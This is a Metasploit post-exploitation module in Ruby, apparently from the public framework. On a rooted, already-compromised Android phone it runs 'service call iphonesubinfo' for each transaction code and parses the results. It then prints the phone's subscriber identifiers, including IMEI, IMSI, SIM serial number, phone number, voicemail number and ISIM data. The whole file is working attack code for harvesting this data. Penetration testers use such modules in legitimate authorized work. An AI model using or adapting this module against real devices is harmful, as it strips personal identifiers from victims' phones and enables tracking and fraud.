##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::Android::Priv
  include Msf::Post::Android::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Extract Subscriber Info',
        'Description' => %q{
          This module displays the subscriber info stored on the target phone.
          It uses call service to get values of each transaction code like IMEI, etc.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Auxilus'],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Platform' => 'android',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
  end

  def run
    fail_with(Failure::NoAccess, 'This module requires root permissions.') unless is_root?

    @transaction_codes ||= [
      'DeviceId',
      'DeviceIdForSubscriber',
      'ImeiForSubscriber',
      'DeviceSvn',
      'SubscriberId',
      'SubscriberIdForSubscriber',
      'GroupIdLevel1',
      'GroupIdLevel1ForSubscriber',
      'IccSerialNumber',
      'IccSerialNumberForSubscriber',
      'Line1Number',
      'Line1NumberForSubscriber',
      'Line1AlphaTag',
      'Line1AlphaTagForSubscriber',
      'Msisdn',
      'MsisdnForSubscriber',
      'VoiceMailNumber',
      'VoiceMailNumberForSubscriber',
      'CompleteVoiceMailNumber',
      'CompleteVoiceMailNumberForSubscriber',
      'VoiceMailAlphaTag',
      'VoiceMailAlphaTagForSubscriber',
      'IsimImpi',
      'IsimDomain',
      'IsimImpu',
      'IsimIst',
      'IsimPcscf',
      'IsimChallengeResponse',
      'IccSimChallengeResponse'
    ]
    arr ||= []
    for code in 1..@transaction_codes.length do
      print_status("using code : #{code}")
      block = cmd_exec("service call iphonesubinfo #{code}")
      value, tc = get_val(block, code)
      arr << [tc, value]
    end

    tc_tbl = Rex::Text::Table.new(
      'Header' => 'Subscriber info',
      'Indent' => 1,
      'Columns' => ['transaction code', 'value']
    )

    arr.each do |a|
      tc_tbl << [
        a[0],     #  TRANSACTION CODE
        a[1]      #  value
      ]
    end
    print_line(tc_tbl.to_s)
  end

  def get_val(data, code)
    parsed = data.gsub(/Parcel/, '')
    string = ''
    100.times do |i|
      next if i % 2 == 0

      str = parsed.split("'")[i]
      break if str.nil?

      string += str
    end
    v = ''
    string.split('.').each do |chr|
      next if chr.nil? || (chr == "\n")

      v += chr
    end
    return v, @transaction_codes[code - 1]
  end
end
